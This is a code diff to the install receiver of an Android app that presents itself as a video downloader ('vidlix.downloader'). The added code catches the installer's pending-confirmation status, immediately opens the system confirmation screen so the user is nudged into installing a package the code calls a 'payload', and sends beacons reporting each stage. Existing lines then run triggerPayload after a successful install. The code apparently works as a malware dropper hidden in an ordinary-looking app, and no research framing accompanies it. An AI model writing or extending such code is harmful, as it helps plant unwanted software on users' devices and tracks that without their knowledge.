@@ -1,5 +1,6 @@
 package com.vidlix.downloader;
 
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -30,8 +31,21 @@ public class InstallReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
+        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
         String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
+
+        if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
+            Intent confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
+            if (confirmIntent != null) {
+                confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(confirmIntent);
+                sendBeacon(context, "payload_awaiting_confirmation");
+            } else {
+                sendBeacon(context, "payload_pending_no_intent");
+            }
+            return;
+        }
+
         if (status == PackageInstaller.STATUS_SUCCESS) {
             sendBeacon(context, "payload_installed");
             triggerPayload(context);
